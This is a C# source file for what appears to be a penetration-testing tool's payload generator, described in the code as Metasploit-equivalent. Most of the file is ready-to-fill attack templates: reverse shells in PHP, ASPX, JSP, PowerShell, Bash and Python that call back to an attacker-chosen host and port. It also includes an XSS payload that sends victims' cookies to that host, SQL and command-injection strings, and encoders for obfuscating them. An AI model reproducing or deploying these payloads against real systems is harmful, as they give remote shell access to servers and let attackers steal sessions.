/*
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Discovery.Core.Interfaces;
using Discovery.Core.Models;
using Discovery.Core.Utilities;
using Discovery.Services.Scanning;
using Spectre.Console;

namespace Discovery.Services.Security.Specialized;

/// <summary>
/// Metasploit-equivalent payload generation and encoding service
/// Implements various payload types and encoding techniques
/// </summary>
public class PayloadGeneratorService : IDisposable
{
    private Dictionary<string, PayloadTemplate> _payloadTemplates;
    private Dictionary<string, Func<string, string>> _encoders;
    private Dictionary<string, List<string>> _platformSpecificPayloads;

    public PayloadGeneratorService()
    {
        InitializePayloadTemplates();
        InitializeEncoders();
        InitializePlatformSpecificPayloads();
    }

    private void InitializePayloadTemplates()
    {
        _payloadTemplates = new Dictionary<string, PayloadTemplate>
        {
            // Web Application Payloads
            ["web/php/reverse_shell"] = new PayloadTemplate
            {
                Name = "PHP Reverse Shell",
                Platform = "PHP",
                Type = "reverse_shell",
                Template = @"<?php
$ip = '{LHOST}';
$port = {LPORT};
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid == -1) {
        exit(1);
    }
    if ($pid) {
        exit(0);
    }
    if (posix_setsid() == -1) {
        exit(1);
    }
    $daemon = 1;
} else {
    printit(""WARNING: Failed to daemonise.  This is quite common and not fatal."");
}

chdir(""/"");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    exit(1);
}

$descriptorspec = array(
   0 => array(""pipe"", ""r""),
   1 => array(""pipe"", ""w""),
   2 => array(""pipe"", ""w"")
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

while (1) {
    if (feof($sock)) {
        break;
    }
    if (feof($pipes[1])) {
        break;
    }
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, 0);
    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read_a)) {
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }
    if (in_array($pipes[2], $read_a)) {
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>",
                RequiredParams = new[] { "LHOST", "LPORT" }
            },

            ["web/aspx/reverse_shell"] = new PayloadTemplate
            {
                Name = "ASPX Reverse Shell",
                Platform = "ASP.NET",
                Type = "reverse_shell",
                Template = @"<%@ Page Language=""C#"" %>
<%@ Import Namespace=""System"" %>
<%@ Import Namespace=""System.Net"" %>
<%@ Import Namespace=""System.Net.Sockets"" %>
<%@ Import Namespace=""System.IO"" %>
<%@ Import Namespace=""System.Diagnostics"" %>
<script runat=""server"">
    void Page_Load(object sender, EventArgs e)
    {
        string ip = ""{LHOST}"";
        int port = {LPORT};
        
        try
        {
            TcpClient client = new TcpClient(ip, port);
            Stream stream = client.GetStream();
            StreamReader reader = new StreamReader(stream);
            StreamWriter writer = new StreamWriter(stream);
            
            Process proc = new Process();
            proc.StartInfo.FileName = ""cmd.exe"";
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardInput = true;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.RedirectStandardError = true;
            proc.Start();
            
            while (!proc.HasExited)
            {
                while (stream.DataAvailable)
                {
                    string cmd = reader.ReadLine();
                    proc.StandardInput.WriteLine(cmd);
                    proc.StandardInput.Flush();
                }
                
                string output = proc.StandardOutput.ReadToEnd();
                string error = proc.StandardError.ReadToEnd();
                
                writer.WriteLine(output + error);
                writer.Flush();
            }
            
            client.Close();
        }
        catch (Exception ex)
        {
            // Silent fail
        }
    }
</script>",
                RequiredParams = new[] { "LHOST", "LPORT" }
            },

            ["web/jsp/reverse_shell"] = new PayloadTemplate
            {
                Name = "JSP Reverse Shell",
                Platform = "JSP",
                Type = "reverse_shell",
                Template = @"<%@ page import=""java.io.*,java.net.*"" %>
<%
    String host = ""{LHOST}"";
    int port = {LPORT};
    String cmd = ""cmd.exe"";
    if (System.getProperty(""os.name"").toLowerCase().indexOf(""windows"") == -1) {
        cmd = ""/bin/sh"";
    }
    Process p = Runtime.getRuntime().exec(cmd);
    Socket s = new Socket(host, port);
    InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
    OutputStream po = p.getOutputStream(), so = s.getOutputStream();
    while (!s.isClosed()) {
        while (pi.available() > 0)
            so.write(pi.read());
        while (pe.available() > 0)
            so.write(pe.read());
        while (si.available() > 0)
            po.write(si.read());
        so.flush();
        po.flush();
        Thread.sleep(50);
        try {
            p.exitValue();
            break;
        } catch (Exception e) {
        }
    }
    p.destroy();
    s.close();
%>",
                RequiredParams = new[] { "LHOST", "LPORT" }
            },

            // PowerShell Payloads
            ["windows/powershell/reverse_shell"] = new PayloadTemplate
            {
                Name = "PowerShell Reverse Shell",
                Platform = "Windows",
                Type = "reverse_shell",
                Template = @"$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();",
                RequiredParams = new[] { "LHOST", "LPORT" }
            },

            // Linux Payloads
            ["linux/bash/reverse_shell"] = new PayloadTemplate
            {
                Name = "Bash Reverse Shell",
                Platform = "Linux",
                Type = "reverse_shell",
                Template = @"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
                RequiredParams = new[] { "LHOST", "LPORT" }
            },

            ["linux/python/reverse_shell"] = new PayloadTemplate
            {
                Name = "Python Reverse Shell",
                Platform = "Linux",
                Type = "reverse_shell",
                Template = @"import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('{LHOST}',{LPORT}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call([""/bin/sh"",""-i""])",
                RequiredParams = new[] { "LHOST", "LPORT" }
            },

            // SQL Injection Payloads
            ["web/sql/union_select"] = new PayloadTemplate
            {
                Name = "SQL Union Select Payload",
                Platform = "SQL",
                Type = "sql_injection",
                Template = @"' UNION SELECT {COLUMNS} FROM {TABLE}-- ",
                RequiredParams = new[] { "COLUMNS", "TABLE" }
            },

            // XSS Payloads
            ["web/xss/alert"] = new PayloadTemplate
            {
                Name = "XSS Alert Payload",
                Platform = "Web",
                Type = "xss",
                Template = @"<script>alert('{MESSAGE}')</script>",
                RequiredParams = new[] { "MESSAGE" }
            },

            ["web/xss/cookie_steal"] = new PayloadTemplate
            {
                Name = "XSS Cookie Stealing Payload",
                Platform = "Web",
                Type = "xss",
                Template = @"<script>document.location='http://{LHOST}:{LPORT}/steal.php?cookie='+document.cookie</script>",
                RequiredParams = new[] { "LHOST", "LPORT" }
            },

            // Command Injection Payloads
            ["web/cmd/linux"] = new PayloadTemplate
            {
                Name = "Linux Command Injection",
                Platform = "Linux",
                Type = "command_injection",
                Template = @"; {COMMAND} #",
                RequiredParams = new[] { "COMMAND" }
            },

            ["web/cmd/windows"] = new PayloadTemplate
            {
                Name = "Windows Command Injection",
                Platform = "Windows",
                Type = "command_injection",
                Template = @"& {COMMAND}",
                RequiredParams = new[] { "COMMAND" }
            }
        };
    }

    private void InitializeEncoders()
    {
        _encoders = new Dictionary<string, Func<string, string>>
        {
            ["base64"] = EncodeBase64,
            ["url"] = EncodeUrl,
            ["html"] = EncodeHtml,
            ["hex"] = EncodeHex,
            ["unicode"] = EncodeUnicode,
            ["powershell_base64"] = EncodePowerShellBase64,
            ["php_chr"] = EncodePhpChr,
            ["sql_char"] = EncodeSqlChar
        };
    }

    private void InitializePlatformSpecificPayloads()
    {
        _platformSpecificPayloads = new Dictionary<string, List<string>>
        {
            ["windows"] = new List<string>
            {
                "windows/powershell/reverse_shell",
                "web/aspx/reverse_shell",
                "web/cmd/windows"
            },
            ["linux"] = new List<string>
            {
                "linux/bash/reverse_shell",
                "linux/python/reverse_shell",
                "web/cmd/linux"
            },
            ["web"] = new List<string>
            {
                "web/php/reverse_shell",
                "web/jsp/reverse_shell",
                "web/xss/alert",
                "web/xss/cookie_steal",
                "web/sql/union_select"
            }
        };
    }

    public async Task<List<ScanResult>> ScanAsync(string target, CancellationToken cancellationToken = default)
    {
        // For payload generation, target represents the payload type or platform
        var results = new List<ScanResult>();
        
        if (!TestEnvironmentDetector.IsTestEnvironment)
        {
            AnsiConsole.MarkupLine($"[yellow]🚀 Generating payloads for platform: {target}[/]");
        }

        var applicablePayloads = GetPayloadsForPlatform(target);
        
        foreach (var payloadKey in applicablePayloads)
        {
            if (_payloadTemplates.ContainsKey(payloadKey))
            {
                var template = _payloadTemplates[payloadKey];
                var payload = GeneratePayload(payloadKey, new Dictionary<string, string>
                {
                    ["LHOST"] = "127.0.0.1",
                    ["LPORT"] = "4444",
                    ["COMMAND"] = "whoami",
                    ["MESSAGE"] = "XSS_Test",
                    ["COLUMNS"] = "1,2,3",
                    ["TABLE"] = "users"
                });

                var result = new ScanResult(
                    IPAddress.Loopback,
                    0,
                    true,
                    "Payload Generator",
                    0,
                    target,
                    $"Generated {template.Name}",
                    DateTime.UtcNow,
                    "Unknown",
                    "localhost",
                    false,
                    $"Payload: {template.Name} - Platform: {template.Platform}",
                    "Generated Payload"
                );
                results.Add(result);
            }
        }

        if (!TestEnvironmentDetector.IsTestEnvironment)
        {
            AnsiConsole.MarkupLine($"[green]✅ Generated {results.Count} payloads for {target}[/]");
        }

        return results;
    }

    public string GeneratePayload(string payloadType, Dictionary<string, string> parameters)
    {
        if (!_payloadTemplates.ContainsKey(payloadType))
        {
            throw new ArgumentException($"Unknown payload type: {payloadType}");
        }

        var template = _payloadTemplates[payloadType];
        var payload = template.Template;

        // Replace parameters in template
        foreach (var param in parameters)
        {
            payload = payload.Replace($"{{{param.Key}}}", param.Value);
        }

        return payload;
    }

    public string EncodePayload(string payload, string encodingType)
    {
        if (!_encoders.ContainsKey(encodingType))
        {
            throw new ArgumentException($"Unknown encoding type: {encodingType}");
        }

        return _encoders[encodingType](payload);
    }

    public List<string> GetAvailablePayloads()
    {
        return _payloadTemplates.Keys.ToList();
    }

    public List<string> GetPayloadsForPlatform(string platform)
    {
        if (_platformSpecificPayloads.ContainsKey(platform.ToLower()))
        {
            return _platformSpecificPayloads[platform.ToLower()];
        }

        // Return all if platform not found
        return _payloadTemplates.Keys.ToList();
    }

    public PayloadTemplate GetPayloadTemplate(string payloadType)
    {
        return _payloadTemplates.ContainsKey(payloadType) ? _payloadTemplates[payloadType] : null;
    }

    public void SavePayloadToFile(string payload, string filePath)
    {
        File.WriteAllText(filePath, payload);
    }

    public List<string> GetAvailableEncoders()
    {
        return _encoders.Keys.ToList();
    }

    // Encoding methods
    private string EncodeBase64(string input)
    {
        return Convert.ToBase64String(Encoding.UTF8.GetBytes(input));
    }

    private string EncodeUrl(string input)
    {
        return Uri.EscapeDataString(input);
    }

    private string EncodeHtml(string input)
    {
        return System.Net.WebUtility.HtmlEncode(input);
    }

    private string EncodeHex(string input)
    {
        return string.Join("", Encoding.UTF8.GetBytes(input).Select(b => $"\\x{b:x2}"));
    }

    private string EncodeUnicode(string input)
    {
        return string.Join("", input.Select(c => $"\\u{(int)c:x4}"));
    }

    private string EncodePowerShellBase64(string input)
    {
        var bytes = Encoding.Unicode.GetBytes(input);
        return Convert.ToBase64String(bytes);
    }

    private string EncodePhpChr(string input)
    {
        return string.Join(".", Encoding.UTF8.GetBytes(input).Select(b => $"chr({b})"));
    }

    private string EncodeSqlChar(string input)
    {
        return string.Join("+", Encoding.UTF8.GetBytes(input).Select(b => $"CHAR({b})"));
    }

    public void Dispose()
    {
        // Nothing to dispose
    }
}

public class PayloadTemplate
{
    public string Name { get; set; } = string.Empty;
    public string Platform { get; set; } = string.Empty;
    public string Type { get; set; } = string.Empty;
    public string Template { get; set; } = string.Empty;
    public string[] RequiredParams { get; set; } = Array.Empty<string>();
}